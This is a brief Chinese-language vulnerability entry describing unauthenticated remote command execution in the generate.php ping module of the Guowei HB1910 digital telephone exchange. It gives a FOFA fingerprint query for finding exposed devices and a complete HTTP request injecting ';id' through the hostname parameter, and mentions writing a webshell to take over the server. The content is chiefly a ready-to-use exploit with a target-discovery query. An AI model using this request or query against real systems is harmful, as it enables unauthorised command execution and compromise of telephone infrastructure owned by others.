# 国威HB1910数字程控电话交换机generate.php未授权RCE漏洞

国威HB1910数字程控电话交换机 generate.php 接口存在远程命令执行漏洞，未经身份验证的恶意攻击者可以利用该漏洞远程执行任意命令，写入webshell后门文件，获取服务器权限。

## fofa

```javascript
body="themes/tenant/css/login.css"
```

## fofa

```javascript
GET /modules/ping/generate.php?send=Ping&hostname=;id HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

![image-20241219145844556](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412191458610.png)